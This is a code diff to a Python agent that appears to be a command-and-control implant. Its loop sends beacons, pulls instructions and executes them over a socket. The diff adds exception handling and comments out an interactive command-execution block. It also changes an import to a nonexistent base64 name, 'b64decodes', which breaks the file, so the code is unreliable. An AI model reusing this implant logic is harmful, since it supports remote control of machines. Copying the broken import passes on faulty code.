@@ -9,7 +9,7 @@ import datetime
 import time
 import socket
 
-from base64 import b64encode, b64decode
+from base64 import b64encode, b64decodes
 import hashlib
 from Crypto import Random
 from Crypto.Cipher import AES
@@ -45,17 +45,17 @@ class TryLoop:
         self.profile['platform'] = platform
         self.profile['pid'] = pid
         while True:
-            #try:
-            self.profile['results'] = []
-            print('[*] Sending beacon for %s' % self.profile.get('paw', 'unknown'))
-            beacon = self._send_beacon()
-            instructions = self._next_instructions(beacon=beacon)
-            sleep = self._handle_instructions(instructions, sock)
-            time.sleep(sleep)
-            """except Exception as e:
+            try:
+                self.profile['results'] = []
+                print('[*] Sending beacon for %s' % self.profile.get('paw', 'unknown'))
+                beacon = self._send_beacon()
+                instructions = self._next_instructions(beacon=beacon)
+                sleep = self._handle_instructions(instructions, sock)
+                time.sleep(sleep)
+            except Exception as e:
                 print('[-] Operation loop error %s' % e)
                 time.sleep(30)
-            command = str(input())
+            """command = str(input())
             to = str(input())
             output = self.exec(command, to, sock)
             print(output)"""
